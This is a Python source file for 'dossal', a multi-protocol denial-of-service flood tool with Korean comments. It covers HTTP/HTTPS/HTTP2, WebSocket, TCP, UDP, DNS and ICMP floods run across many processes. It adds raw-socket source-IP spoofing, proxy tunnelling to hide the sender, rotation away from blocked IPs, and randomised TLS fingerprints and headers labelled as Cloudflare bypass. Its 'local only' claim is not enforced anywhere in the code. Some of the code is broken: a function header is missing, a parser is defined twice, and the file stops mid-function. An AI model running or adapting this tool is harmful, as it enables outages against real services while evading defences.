#!/usr/bin/env python3
"""
dossal v0.6 - comprehensive DoS stress engine
Modes:
  http       : HTTP/1.1 keep-alive request flood (plain)
  https      : TLS request flood (HTTP/1.1, self-signed cert)
  websocket  : WebSocket upgrade flood
  tcp        : raw TCP byte flood
  udp        : raw UDP datagram flood
  h2         : HTTP/2 multiplexed request flood
  grpc       : gRPC (HTTP/2 + gRPC framing) request flood
  quic       : QUIC/HTTP3 UDP datagram flood (simulated Initial packets)
  syn        : TCP SYN flood (connect-only, no read)
  synack     : TCP connect + immediate close (ACK flood / connection exhaustion)
  rst        : TCP RST flood (connect -> send RST via close)
  fin        : TCP FIN flood (graceful close after connect)
  slowloris  : Slow HTTP header drip (hold connections open)
  udy        : UDP datagram flood (alias for udp)
Targets are local only. JSON stats output. Multi-mode: --mode http,h2,udp
"""
import asyncio, ssl, socket, json, math, struct, random, time, argparse, signal, sys, base64, os, logging, threading
from urllib.parse import urlparse
logging.getLogger('asyncio').setLevel(logging.CRITICAL)

# Platform detection
import platform
_IS_WINDOWS = platform.system() == 'Windows'
if _IS_WINDOWS:
    import ctypes
    # Windows IP_HDRINCL (not in Python socket module)
    IP_HDRINCL = 2

_SRC_IPS = [None]  # type: ignore  # active source IPs (list)
_BLOCKED_IPS = set()  # IPs that received 429 (blocked by target)
_JITTER = [0.0]  # Jitter delay in seconds, set by --jitter
_ROTATE_INTERVAL = [5.0]  # IP rotation interval in seconds
_SPOOF_MODE = [False]  # True = stealth mode (use spoofed IPs, hide real IP)
_RECOVERY = [False]  # True = auto-replace blocked IPs
_PROXY = [None]  # proxy URL: "http://host:port" or "socks5://user:pass@host:port"

def _parse_proxy(proxy_url):
    """프록시 URL을 (스키미, 호스트, 포트, 사용자, 패스워드)로 파싱"""
    from urllib.parse import urlparse
    p = urlparse(proxy_url)
    return {
        'scheme': p.scheme,  # http, socks5
        'host': p.hostname,
        'port': p.port or (8080 if p.scheme == 'http' else 1080),
        'user': p.username,
        'pass': p.password,
    }

    
    proxy = _parse_proxy(_PROXY[0])
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((proxy['host'], proxy['port']))
    
    if proxy['scheme'] == 'http':
        # HTTP CONNECT tunnel
        connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
        sock.sendall(connect_req.encode())
        response = sock.recv(4096)
        if b'200' not in response:
            sock.close()
            raise OSError(f"Proxy CONNECT failed: {response[:100]}")
    
    elif proxy['scheme'] == 'socks5':
        # SOCKS5 handshake (basic, no auth or password auth)
        # Greeting: VER=5, NMETHODS=1, METHOD=0 (no auth) or 2 (password)
        if proxy['user']:
            sock.sendall(b'\x05\x02\x00\x02')  # no auth + user/pass
        else:
            sock.sendall(b'\x05\x01\x00')  # no auth
        response = sock.recv(2)
        if response[1] == 2:
            # User/pass auth
            ulen = len(proxy['user'] or '')
            plen = len(proxy['pass'] or '')
            auth = bytes([1, ulen]) + (proxy['user'] or '').encode() + bytes([plen]) + (proxy['pass'] or '').encode()
            sock.sendall(auth)
            auth_resp = sock.recv(2)
            if auth_resp[1] != 0:
                sock.close()
                raise OSError("SOCKS5 auth failed")
        # Connect request
        host_bytes = host.encode()
        connect_req = b'\x05\x01\x00\x03' + bytes([len(host_bytes)]) + host_bytes + port.to_bytes(2, 'big')
        sock.sendall(connect_req)
        response = sock.recv(10)
        if response[1] != 0:
            sock.close()
            raise OSError(f"SOCKS5 connect failed: {response[1]}")
    
    return sock, proxy

def _detect_local_ips():
    """로컬 IPv4 주소 전부 감지"""
    import subprocess
    ips = set()
    try:
        out = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5).stdout
        for line in out.split('\n'):
            line = line.strip()
            if line.startswith('inet '):
                ip = line.split()[1]
                if ip != '127.0.0.1' and not ip.startswith('169.'):
                    ips.add(ip)
    except Exception:
        pass
    ips.add('127.0.0.1')
    return sorted(ips)

def _generate_spoof_ips(count, base_net='203.0.113'):
    """RFC 5737 TEST-NET-3(203.0.113.0/24)에서 N개 스푸핑 IP 생성"""
    import random
    ips = []
    # Use multiple /24 blocks to avoid collision
    for block in range(count // 200 + 1):
        # Each block: 203.0.113.0 - 203.0.113.255 (TEST-NET-3, unclaimed)
        base = f'{base_net}'
        for i in range(min(200, count - len(ips))):
            ip = f'{base}.{i + block * 200 + 1}'
            if ip not in ips:
                ips.append(ip)
    return ips[:count]

def _get_src_ip(proc_idx, total_procs):
    """프로세스별 소스 IP 반환 (라운드 로빈, 차단 IP 제외)"""
    ips = _SRC_IPS[0]
    if not ips:
        return None
    if _RECOVERY[0] and _BLOCKED_IPS:
        # Filter out blocked IPs
        active = [ip for ip in ips if ip not in _BLOCKED_IPS]
        if active:
            return active[proc_idx % len(active)]
    return ips[proc_idx % len(ips)] if ips else None

def _active_ip_count():
    """차단되지 않은 IP 개수 반환"""
    ips = _SRC_IPS[0]
    if not ips:
        return 0
    return sum(1 for ip in ips if ip not in _BLOCKED_IPS)
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived

VERSION = "3.16"

# ── TCP/IP checksum ──────────────────────────────────────────────
def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
    """TCP 헤더 체크섬 계산 (IPv4). int 반환"""
    ihl = 20  # no IP options
    ip_hdr = struct.pack("!4s4sBBHHHBBH4s4s",
        bytes([0]*4), bytes([0]*4),  # dummy IPs (loopback)
        0, 0, 0, 0, 64, 6, 0, src, dst)
    # Actually build proper pseudo-header
    pseudo = struct.pack("!4s4sBBHHHBBH",
        bytes([int(x) for x in src.split('.')]) if isinstance(src, str) else src,
        bytes([int(x) for x in dst.split('.')]) if isinstance(dst, str) else dst,
        0, 6, ihl + len(payload), 0, 0)
    tcp_hdr = struct.pack("!HHIIBBHHH",
        sport, dport, seq, ack,
        5 << 4, flags, 0, 0, 0)
    data = pseudo + tcp_hdr + payload
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

# ── Stats ─────────────────────────────────────────────────────────
class Stats:
    def __init__(self):
        self.requests=0; self.bytes=0; self.errors=0; self.opens=0
        self.ws_msgs=0; self.packets=0; self.conns=0
    def rps(self, dur): return self.requests/dur if dur else 0
    def bps(self, dur): return self.bytes/dur if dur else 0
    def pps(self, dur): return self.packets/dur if dur else 0
    def report(self, modes, url, conns, dur):
        d = {
          "tool":"dossal","version":VERSION,"modes":modes,"url":url,
          "connections":conns,"duration_s":dur,
          "requests":self.requests,"rps":round(self.rps(dur),2),
          "bytes":self.bytes,"bps":round(self.bps(dur),2),
          "packets":self.packets,"pps":round(self.pps(dur),2),
          "ws_messages":self.ws_msgs,
          "connections_made":self.conns,
          "errors":self.errors
        }
        return d

# ── URL parsers ───────────────────────────────────────────────────
def parse_http(u):
    """HTTP(S) URL을 (호스트, 포트, 경로)로 파싱"""
    host, port = _host_port(u)
    p = urlparse(u)
    return host, port, p.path or "/"

def _host_port(u):
    """URL에서 (호스트, 포트) 추출. http/https/udp/tcp 등 모든 스키미 지원."""
    if '://' not in u:
        parts = u.rsplit(':', 1)
        if len(parts) == 2:
            return parts[0], int(parts[1])
        return u, 80
    p = urlparse(u)
    port = p.port
    if port is None:
        # No port in URL: use scheme default
        port = 443 if p.scheme in ('https', 'wss') else 80
    return p.hostname or '127.0.0.1', int(port)

def parse_http(u):
    """HTTP(S) URL을 (호스트, 포트, 경로)로 파싱"""
    host, port = _host_port(u)
    p = urlparse(u)
    return host, port, p.path or '/'

def parse_tcp(u):
    """tcp:// URL을 (호스트, 포트)로 파싱"""
    return _host_port(u)

def parse_udp(u):
    """udp:// URL을 (호스트, 포트)로 파싱"""
    return _host_port(u)

def parse_ws(u):
    """ws:// 또는 wss:// URL 파싱."""
    from urllib.parse import urlparse
    host, port = _host_port(u)
    p = urlparse(u)
    if p.scheme == 'wss':
        port = 443 if not p.port else p.port
    else:
        port = 80 if not p.port else p.port
    return host, port, p.path or "/"

def parse_ip_port(u):
    """IP:포트를 파싱. (호스트, 포트) 반환"""
    return _host_port(u)

# ── HTTP response reader ──────────────────────────────────────────
async def _read_http_response(reader):
    """HTTP 응답을 Content-Length 기반으로 전체 읽기"""
    header_data = b''
    while b'\r\n\r\n' not in header_data:
        try:
            chunk = await asyncio.wait_for(reader.read(1024), timeout=5.0)
        except asyncio.TimeoutError:
            return b''
        if not chunk:
            return b''
        header_data += chunk
    header_end = header_data.find(b'\r\n\r\n')
    headers_part = header_data[:header_end].decode('latin1')
    body_start = header_end + 4
    body = header_data[body_start:]
    for line in headers_part.split('\r\n'):
        if line.lower().startswith('content-length:'):
            content_length = int(line.split(':', 1)[1].strip())
            while len(body) < content_length:
                try:
                    chunk = await asyncio.wait_for(reader.read(8192), timeout=5.0)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                body += chunk
            body = body[:content_length]
            break
    return header_data[:body_start] + body

# ═══════════════════════════════════════════════════════════════════
# WORKERS
# ═══════════════════════════════════════════════════════════════════

async def http_worker(name, url, stats, duration, stop, payload_size=0):
    """HTTP L7 공격 워커: asyncio 기반 HTTP 요청 폭주"""
    host, port, path = parse_http(url)
    reader, writer = await asyncio.open_connection(host, port)
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
           f"User-Agent: dossal/{VERSION}\r\n\r\n")
    req_bytes = req.encode()

    while not stop.is_set():
        try:
            async def _write_read():
                writer.write(req_bytes)
                await writer.drain()
                return await _read_http_response(reader)
            resp = await asyncio.wait_for(_write_read(), timeout=10.0)
            if not resp:
                stats.errors += 1
                continue
            stats.requests += 1
            stats.bytes += len(resp)
        except (asyncio.TimeoutError, Exception):
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.abort()

def _make_tls_ctx(proc_idx):
    """TLS 컨텍스트 생성 (fingerprint 랜덤화: cipher/ALPN/SNI 변동)"""
    import ssl as _ssl
    import random as _rnd
    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    
    # Randomize cipher list (order matters for JA3)
    ciphers = [
        'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
        'DHE-RSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256', 'DHE-RSA-AES128-GCM-SHA256',
    ]
    # Shuffle a random subset
    _rnd.shuffle(ciphers)
    subset = ciphers[:_rnd.randint(4, 10)]
    try:
        ctx.set_ciphers(':'.join(subset))
    except Exception:
        pass
    
    # Randomize ALPN
    alpn_options = [
        ['h2', 'http/1.1'],
        ['http/1.1'],
        ['h2'],
        [],
    ]
    alpn = _rnd.choice(alpn_options)
    if alpn:
        try:
            ctx.set_alpn_protocols(alpn)
        except Exception:
            pass
    
    # Randomize minimum TLS version
    min_tls_options = [_ssl.TLSVersion.TLSv1_2, _ssl.TLSVersion.TLSv1_3]
    if _rnd.random() < 0.7:
        ctx.minimum_version = _ssl.TLSVersion.TLSv1_2
    else:
        ctx.minimum_version = _ssl.TLSVersion.TLSv1_3
    
    return ctx

def _mp_https_flood(args_tuple):
    """멀티프로세스 HTTPS 전송 (TLS 1.3 0-RTT + fingerprint 랜덤화)"""
    import time as _time
    import ssl as _ssl
    import socket as _socket
    import random as _rnd
    if len(args_tuple) == 5:
        host, port, path, duration, proc_idx = args_tuple
    else:
        host, port, path, duration = args_tuple
        proc_idx = 0
    sent = 0
    errors = 0
    # First connection: full TLS handshake, cache session for 0-RTT
    ssock = None
    cached_session = None
    ctx = None
    for attempt in range(3):
        try:
            ctx = _make_tls_ctx(proc_idx + attempt * 100)
            raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            raw.settimeout(5.0)
            raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
            raw.connect((host, port))
            # Random SNI (sometimes use IP, sometimes hostname)
            sni = host if _rnd.random() < 0.8 else None
            ssock = ctx.wrap_socket(raw, server_hostname=sni)
            # Cache session for 0-RTT reuse
            try:
                cached_session = ssock.session
            except Exception:
                pass
            break
        except Exception:
            try:
                raw.close()
            except Exception:
                pass
            _time.sleep(0.3)
    if ssock is None:
        return 0, 1
    
    # Use randomized HTTP request
    req = _random_http_req(host, path)
    req_counter = 0
    
    def _reconnect_0rtt():
        """Reconnect using cached session with 0-RTT early data."""
        nonlocal ssock, sent
        try:
            raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            raw.settimeout(3.0)
            raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
            raw.connect((host, port))
            ssock = ctx.wrap_socket(raw, server_hostname=host)
            # Load cached session for 0-RTT
            if cached_session is not None:
                try:
                    ssock.session = cached_session
                except Exception:
                    pass
            return True
        except Exception:
            return False
    
    end = _time.time() + duration
    while _time.time() < end:
        try:
            req_counter += 1
            if req_counter % 500 == 0:
                req = _random_http_req(host, path)
            if _JITTER[0] > 0:
                import random as _rj
                _time.sleep(_rj.uniform(0, _JITTER[0]))
            ssock.sendall(req)
            data = ssock.recv(65535)
            if not data:
                break
            sent += 1
        except Exception:
            # Reconnect with 0-RTT if session cached
            if cached_session is not None:
                if not _reconnect_0rtt():
                    break
            else:
                break
    try:
        ssock.close()
    except Exception:
        pass
    return sent, errors

async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
    """HTTPS 멀티프로세스 공격 워커: N개 프로세스, 각각 1개 TLS 연결"""
    host, port, path = parse_http(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    # Each process gets a unique index for TLS fingerprint variation
    targets = [(host, port, path, duration, i) for i in range(n_procs)]
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_https_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for sent, errs in results:
        stats.requests += sent
        stats.errors += errs
    stats.conns += n_procs

async def https_worker(name, url, stats, duration, stop, payload_size=0):
    """HTTPS L7 공격 워커: TLS + HTTP 요청 폭주"""
    host, port, path = parse_http(url)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
           f"User-Agent: dossal/{VERSION}\r\n\r\n")
    req_bytes = req.encode()
    while not stop.is_set():
        if _JITTER[0] > 0:
            import random as _rj
            await asyncio.sleep(_rj.uniform(0, _JITTER[0]))
        try:
            async def _write_read():
                writer.write(req_bytes)
                await writer.drain()
                return await _read_http_response(reader)
            resp = await asyncio.wait_for(_write_read(), timeout=10.0)
            if not resp:
                stats.errors += 1
                continue
            stats.requests += 1
            stats.bytes += len(resp)
        except (asyncio.TimeoutError, Exception):
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.abort()

async def ws_worker(name, url, stats, duration, stop, payload_size=128):
    """WebSocket 공격 워커: WS 연결 유지 + 메시지 폭주"""
    host, port, path = parse_ws(url)
    reader, writer = await asyncio.open_connection(host, port)
    key = base64.b64encode(random.randbytes(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\n\r\n")
    writer.write(req.encode()); await writer.drain()
    try:
        handshake = await asyncio.wait_for(reader.read(8192), timeout=0.5)
    except asyncio.TimeoutError:
        stats.errors += 1
        writer.close()
        return
    if b"101" not in handshake:
        stats.errors += 1
        writer.close(); return
    stats.conns += 1
    payload = b"x" * payload_size
    import time as _time
    _ws_start = _time.time()
    while not stop.is_set():
        if _time.time() - _ws_start > duration:
            break
        try:
            mask = random.randbytes(4)
            masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
            header = struct.pack("!B", 0x81)
            if len(payload) < 126:
                header += struct.pack("!B", 0x80 | len(payload))
            else:
                header += struct.pack("!BH", 0x80 | 126, len(payload))
            header += mask
            writer.write(header + masked)
            await asyncio.wait_for(writer.drain(), timeout=0.1)
            stats.ws_msgs += 1
            stats.bytes += len(header) + len(masked)
        except asyncio.TimeoutError:
            break
        except Exception:
            stats.errors += 1
            break
    try:
        writer.transport.set_write_buffer_limits(high=65536)
        writer.close()
        await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
    except Exception:
        pass

def _mp_tcp_flood(args_tuple):
    """멀티프로세스 TCP 바이트 패킷: 연결 후 반복 전송."""
    host, port, duration, payload_size = args_tuple
    import time as _time
    payload = b"A" * payload_size
    bytes_sent = 0
    pkts = 0
    errors = 0
    end = _time.time() + duration
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((host, port))
        while _time.time() < end:
            try:
                s.send(payload)
                bytes_sent += len(payload)
                pkts += 1
            except Exception:
                break
        s.close()
    except Exception:
        errors += 1
    return bytes_sent, pkts, errors

async def tcp_worker(name, url, stats, duration, stop, payload_size=1024):
    """TCP L4 공격 워커: 반복 TCP 연결 폭주"""
    host, port = parse_tcp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))  # TCP uses same proc count
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_tcp_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0, 0)] * n_procs
    stats.conns += n_procs
    for bytes_sent, pkts, errors in results:
        stats.bytes += bytes_sent
        stats.packets += pkts
        stats.errors += errors

_UDP_NPROCS = [4]  # mutable list to allow global override

def _mp_udp_send(args_tuple):
    """멀티프로세스 UDP 패킷 전송"""
    host, port, duration, payload_size = args_tuple
    import time as _time
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    payload = b"B" * payload_size
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 2000
        try:
            for _ in range(n):
                sock.sendto(payload, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

def _mp_udp_spoof(args_tuple):
    """멀티프로세스 UDP 송신 (소스 IP 바인딩).
    각 프로세스는 풀에서 다른 소스 IP에 바인딩.
    Windows(관리자): raw socket + IP_HDRINCL로 진짜 스푸핑.
    macOS/Linux: SOCK_DGRAM + bind()로 로컬 IP."""
    import time as _time
    import struct as _struct
    host, port, duration, payload_size, src_ip = args_tuple
    
    if _IS_WINDOWS:
        # Windows: raw socket + IP_HDRINCL (true IP spoofing)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            
            # Build IP header with spoofed source IP
            src_bytes = socket.inet_aton(src_ip) if src_ip else socket.inet_aton('0.0.0.0')
            dst_bytes = socket.inet_aton(host)
            udp_len = 8 + payload_size
            total_len = 20 + udp_len
            
            # IP header: version/ihl, tos, total_len, id, flags/frag, ttl, proto, checksum, src, dst
            ip_header = _struct.pack('!BBHHHBBH4s4s',
                0x45, 0, total_len, 0, 0, 64, 17, 0,
                src_bytes, dst_bytes)
            
            # UDP header: src_port, dst_port, length, checksum
            udp_header = _struct.pack('!HHHH', 54321, port, udp_len, 0)
            payload = b"B" * payload_size
            full_packet = ip_header + udp_header + payload
            
            sent = 0
            end = _time.time() + duration
            while _time.time() < end:
                n = 2000
                try:
                    for _ in range(n):
                        sock.sendto(full_packet, (host, port))
                    sent += n
                except Exception:
                    break
            sock.close()
            return sent
        except (OSError, PermissionError):
            # Fallback to SOCK_DGRAM if raw socket fails (non-admin)
            pass
    
    # macOS/Linux or fallback: SOCK_DGRAM + bind
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    
    if src_ip and src_ip != '0.0.0.0':
        try:
            sock.bind((src_ip, 0))
        except OSError:
            sock.bind(('0.0.0.0', 0))
    
    payload = b"B" * payload_size
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 2000
        try:
            for _ in range(n):
                sock.sendto(payload, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
    """UDP L4 공격 워커: 멀티프로세스 UDP 패킷 폭주"""
    host, port = parse_udp(url)
    n_procs = _UDP_NPROCS[0]
    
    # Spawn N child processes
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    
    if _SPOOF_MODE[0] and _SRC_IPS[0]:
        # IP spoofing mode: each process uses a different spoofed source IP
        targets = []
        for i in range(n_procs):
            src_ip = _get_src_ip(i, n_procs)
            if src_ip:
                targets.append((host, port, duration, payload_size, src_ip))
        if targets:
            pool = ctx.Pool(len(targets))
            async_result = pool.map_async(_mp_udp_spoof, targets)
            results = await _wait_pool(pool, async_result, duration + 15)
            if results is None:
                results = [0] * len(targets)
            total = sum(results) if isinstance(results, list) else results
            stats.packets += total
            stats.bytes += total * payload_size
            print(f"[spoof] UDP: {total} packets sent from {len(targets)} spoofed IPs", file=sys.stderr)
            return
    
    targets = [(host, port, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_udp_send, targets)
    
    # Wait for completion
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * payload_size

async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
    """HTTP/2 (h2) 공격 워커: ALPN 협상 + H2 스트림 폭주"""
    host, port, path = parse_http(url)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    writer.write(conn.data_to_send())
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(8192), timeout=2.0)
        conn.receive_data(data)
    except Exception:
        pass
    # Header pool for H2 (CF bypass: sec-fetch-*, sec-ch-ua)
    import random as _rnd
    def _h2_headers():
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        ]
        paths = [path, '/', '/index.html', '/api', '/static/app.js', '/favicon.ico']
        return [
            (':method', 'GET'),
            (':scheme', 'https'),
            (':authority', host),
            (':path', _rnd.choice(paths)),
            ('user-agent', _rnd.choice(uas)),
            ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
            ('accept-language', _rnd.choice(['en-US,en;q=0.9', 'ko-KR,ko;q=0.9'])),
            ('sec-fetch-dest', 'document'),
            ('sec-fetch-mode', 'navigate'),
            ('sec-fetch-site', 'none'),
            ('sec-fetch-user', '?1'),
            ('upgrade-insecure-requests', '1'),
        ]
    
    # Batched h2: send N requests, then drain responses
    import os as _os
    BATCH = int(_os.environ.get('DOSSAL_H2_BATCH', '32'))
    error = None
    h2_429 = 0
    while not stop.is_set():
        if _JITTER[0] > 0:
            import random as _rj
            await asyncio.sleep(_rj.uniform(0, _JITTER[0]))
        try:
            # Randomize headers per batch
            batch_headers = _h2_headers()
            for _ in range(BATCH):
                if stop.is_set():
                    break
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, batch_headers, end_stream=True)
            data = conn.data_to_send()
            if data:
                writer.write(data)
                await asyncio.wait_for(writer.drain(), timeout=5.0)
            stats.requests += BATCH
            # Drain available responses (non-blocking read)
            deadline = time.time() + 1.0
            while time.time() < deadline:
                try:
                    chunk = await asyncio.wait_for(reader.read(65535), timeout=0.05)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                events = conn.receive_data(chunk)
                for event in events:
                    if isinstance(event, DataReceived):
                        stats.bytes += len(event.data)
                    elif isinstance(event, ResponseReceived):
                        # h2 headers are list of (name, value) tuples
                        for hname, hval in event.headers:
                            if hname == ':status' and hval == '429':
                                h2_429 += 1
                                break
        except Exception as e:
            stats.errors += 1
            error = e
            break
    if h2_429 > 0:
        print(f"[h2] {h2_429} 429 responses received", file=sys.stderr)
    if writer.transport:
        writer.transport.abort()

# ── DNS flood: UDP DNS query flood ──────────────────────────────
def _mp_dns_flood(args_tuple):
    """멀티프로세스 DNS 쿼리 패킷: 스푸핑 소스 IP + 랜덤 도메인."""
    import time as _time
    import random as _rnd
    import struct as _struct
    host, port, duration, src_ip = args_tuple
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    if src_ip:
        try:
            sock.bind((src_ip, 0))
        except OSError:
            pass
    
    # Random domain names
    domains = ['example.com', 'google.com', 'cloudflare.com', 'test.org', 'domain.net',
               'a.b.c.d', 'sub.domain.com', 'api.service.io', 'cdn.assets.com', 'mail.server.net']
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                # DNS query: header (12 bytes) + question
                # Header: ID, flags(0x0100=RD), QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
                query_id = _rnd.randint(0, 65535)
                domain = _rnd.choice(domains)
                # Encode domain name
                qname = b''
                for label in domain.split('.'):
                    qname += bytes([len(label)]) + label.encode()
                qname += b'\x00'
                # Question: qname + QTYPE(1=A) + QCLASS(1=IN)
                question = qname + _struct.pack('!HH', 1, 1)
                dns_packet = _struct.pack('!HHHHHH', query_id, 0x0100, 1, 0, 0, 0) + question
                sock.sendto(dns_packet, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def dns_worker(name, url, stats, duration, stop, payload_size=0):
    """DNS amplification 워커: UDP DNS 쿼리 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(16, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = []
    for i in range(n_procs):
        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
        targets.append((host, port, duration, src_ip))
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_dns_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 60  # avg DNS query size

# ── ICMP flood: ping flood ──────────────────────────────────────
def _mp_icmp_flood(args_tuple):
    """멀티프로세스 ICMP ping 패킷."""
    import time as _time
    import struct as _struct
    import os
    host, port, duration = args_tuple
    # ICMP raw socket (needs root/admin on most systems)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname('icmp'))
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except PermissionError:
        # Fallback: use UDP to simulate (less effective)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # ICMP echo request: type=8, code=0, checksum, id, seq, payload
    pid = os.getpid() & 0xFFFF
    payload = b'dossal-icmp-ping-payload-' * 8  # 256 bytes
    sent = 0
    end = _time.time() + duration
    seq = 0
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                seq = (seq + 1) & 0xFFFF
                # ICMP header: type(8), code(0), checksum(0), id, seq
                icmp_hdr = _struct.pack('!BBHHH', 8, 0, 0, pid, seq)
                packet = icmp_hdr + payload
                # Calculate ICMP checksum
                if len(packet) % 2:
                    packet += b'\x00'
                s = 0
                for i in range(0, len(packet), 2):
                    w = (packet[i] << 8) + packet[i+1]
                    s += w
                s = (s >> 16) + (s & 0xFFFF)
                s += s >> 16
                checksum = ~s & 0xFFFF
                packet = _struct.pack('!BBHHH', 8, 0, checksum, pid, seq) + payload
                try:
                    if sock.type == socket.SOCK_RAW:
                        sock.sendto(packet, (host, 0))
                    else:
                        sock.sendto(packet, (host, 7))  # port 7 for UDP fallback
                except Exception:
                    pass
                sent += 1
        except Exception:
            break
    sock.close()
    return sent

async def icmp_worker(name, url, stats, duration, stop, payload_size=0):
    """ICMP flood 워커: UDP로 ICMP 패킷 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_icmp_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
